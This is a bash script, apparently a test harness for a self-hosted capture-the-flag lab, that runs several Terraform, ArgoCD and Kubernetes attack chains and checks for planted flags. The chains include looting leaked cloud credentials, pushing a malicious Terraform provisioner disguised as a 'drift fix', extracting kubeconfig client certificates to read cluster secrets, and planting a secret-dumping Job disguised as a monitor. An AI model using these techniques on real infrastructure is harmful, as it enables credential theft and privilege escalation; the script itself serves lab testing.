#!/usr/bin/env bash
# playthrough.sh — runs ON the edge (operator/controller). ACTUALLY exploits each ENABLED scenario
# as a player on the VPC would, and checks the planted flag. Proves the kill-chains fire end-to-end
# (not just that artifacts exist). New tracks are appended here as M2 lands them.
#   usage (from repo root, via orchestrator):  ./orchestrator/lab verify   (or scp + run on edge)
OP=/opt/minilab2/op.key
S="ssh -i $OP -o StrictHostKeyChecking=no -o ConnectTimeout=15"
on(){ h="$1"; shift; $S root@"$h" "$@"; }
AU=svc-admin; AP='Min2lab-Adm!n-2026'; G=http://gitea:3000
PASS=0; FAIL=0; declare -a FAILED
ok(){ printf '  \033[1;32mPASS\033[0m %-6s %s\n' "$1" "$2"; PASS=$((PASS+1)); }
no(){ printf '  \033[1;31mFAIL\033[0m %-6s %s\n' "$1" "$2"; FAIL=$((FAIL+1)); FAILED+=("$1"); }
# chk <id> <flag-inner> <captured-output>
chk(){ if echo "$3" | grep -q "MINILAB{$2}"; then ok "$1" "captured MINILAB{$2}"; \
       else no "$1" "no flag (got: $(echo "$3" | tr -d '\n' | head -c160))"; fi; }
enabled(){ grep -qxF "$1" /opt/minilab2/enabled_scenarios 2>/dev/null; }
# rsx <host> <user> — run a script read from stdin on <host> as <user>, via base64 (no quoting hell)
rsx(){ local host="$1" user="$2" b64; b64=$(base64 -w0)
  if [ "$user" = root ]; then on "$host" "echo $b64 | base64 -d | bash"
  else on "$host" "f=/tmp/.rsx.$$; echo $b64 | base64 -d > \$f; chmod 755 \$f; su $user -c \"bash \$f\"; rm -f \$f"; fi; }

echo "### Terraform / IaC kill-chains ###"

# --- tf_3: cross-team remote state exfil -------------------------------------
# foothold on the alpha apply host (atlantis) -> loot leaked beta cloud creds ->
# use them against MinIO to read team beta's remote state (cross-tenant boundary break).
if enabled tf_3; then
  creds=$(on atlantis "cat /home/deployer/.beta/creds 2>/dev/null")
  bk=$(echo "$creds" | sed -n 's/AWS_ACCESS_KEY_ID=//p'); bs=$(echo "$creds" | sed -n 's/AWS_SECRET_ACCESS_KEY=//p')
  if [ -n "$bk" ] && [ -n "$bs" ]; then
    out=$(on backend "mc alias set tf3 http://127.0.0.1:9000 '$bk' '$bs' >/dev/null 2>&1 && mc cat tf3/tf-state-beta/prod/terraform.tfstate 2>/dev/null")
    chk tf_3 tf_3-cross-team-state "$out"
  else no tf_3 "no leaked beta creds on atlantis"; fi
fi

# --- tf_4: writable auto-applied IaC + scheduled apply (deployer identity) ----
# attacker with SCM write poisons the repo the cron drift-apply pulls; the scheduled
# `iac-apply.sh` then runs attacker code as the privileged deployer -> reads deployer's flag.
if enabled tf_4; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  cat > "$W/infra/pwn.tf" <<'TF'
resource "null_resource" "pwn" {
  triggers = { ts = timestamp() }   # re-fire on every apply (repeatable kill-chain)
  provisioner "local-exec" { command = "cat /home/deployer/flag.txt > /tmp/tf4-proof 2>/dev/null" }
}
TF
  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "drift fix" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  on atlantis "rm -f /tmp/tf4-proof; su deployer -c /usr/local/bin/iac-apply.sh" >/dev/null 2>&1
  chk tf_4 tf_4-state-poisoning "$(on atlantis 'cat /tmp/tf4-proof 2>/dev/null')"
fi

# --- tf_5: transitive module exec (trusted module pulls a submodule w/ a provisioner) ---
# consume the "trusted" alpha/tf-modules//note; it now transitively sources a nested module
# whose local-exec fires on apply -> writes the proof. Player applies a tiny consumer.
if enabled tf_5; then
  out=$(rsx atlantis deployer <<'EOF'
set -e
cd /home/deployer; rm -rf pt5; mkdir pt5; cd pt5
cat > main.tf <<'TF'
module "note" {
  source = "git::http://gitea:3000/alpha/tf-modules.git//note?ref=main"
  name   = "pt5"
}
TF
rm -f /tmp/tf5-proof
/usr/local/bin/terraform init -input=false -no-color >/dev/null 2>&1
/usr/local/bin/terraform apply -auto-approve -no-color >/dev/null 2>&1
cat /tmp/tf5-proof 2>/dev/null
EOF
)
  chk tf_5 tf_5-transitive-module "$out"
fi

# --- tf_6: over-privileged apply identity -> cluster-admin kubeconfig -> crown secret ---
# the apply host holds a cluster-admin kubeconfig (over-priv). Use its client cert to hit the
# k8s API directly (no kubectl needed) and read a kube-system secret only cluster-admin can see.
if enabled tf_6; then
  out=$(rsx atlantis root <<'EOF'
set -e
K=/home/deployer/.kube/config
T=$(mktemp -d)
grep 'certificate-authority-data' "$K" | awk '{print $2}' | base64 -d > "$T/ca"
grep 'client-certificate-data'    "$K" | awk '{print $2}' | base64 -d > "$T/crt"
grep 'client-key-data'            "$K" | awk '{print $2}' | base64 -d > "$T/key"
curl -s --cacert "$T/ca" --cert "$T/crt" --key "$T/key" \
  https://k8s:6443/api/v1/namespaces/kube-system/secrets/crown \
  | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
rm -rf "$T"
EOF
)
  chk tf_6 tf_6-k8s-rbac-backdoor "$out"
fi

echo "### GitOps / Kubernetes kill-chains ###"

# --- k8s_1: ArgoCD AppProject escape -> deploy a Job into the restricted platform namespace ----
if enabled k8s_1; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  cat > "$W/app/deploy/escape.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: crown, key: flag } }
YML
  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "add monitor job" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n platform delete job exfil --ignore-not-found >/dev/null 2>&1
k3s kubectl -n argocd annotate app alpha-app argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1
for i in $(seq 1 40); do k3s kubectl -n platform get job exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 25); do
  p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break
  sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
EOF
)
  chk k8s_1 k8s_1-argo-project-escape "$out"
fi

# --- k8s_2: pipeline SA -> create pod as a parked cluster-admin SA -> cross-team secret ----
if enabled k8s_2; then
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
TOK=$(k3s kubectl -n alpha create token alpha-ci)
KA="k3s kubectl --server=https://127.0.0.1:6443 --insecure-skip-tls-verify --token=$TOK"
k3s kubectl -n alpha delete pod esc --ignore-not-found >/dev/null 2>&1
cat <<'POD' | $KA -n alpha apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: { name: esc }
spec:
  serviceAccountName: alpha-deploy
  restartPolicy: Never
  containers:
  - name: x
    image: curlimages/curl:8.10.1
    command: ["sh","-c","T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \"Authorization: Bearer $T\" https://kubernetes.default.svc/api/v1/namespaces/beta/secrets/rbac-crown"]
POD
for i in $(seq 1 30); do
  ph=$(k3s kubectl -n alpha get pod esc -o jsonpath='{.status.phase}' 2>/dev/null)
  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
done
sleep 4
k3s kubectl -n alpha logs esc 2>/dev/null | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
EOF
)
  chk k8s_2 k8s_2-rbac-escalation "$out"
fi

echo
printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
[ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
exit 0
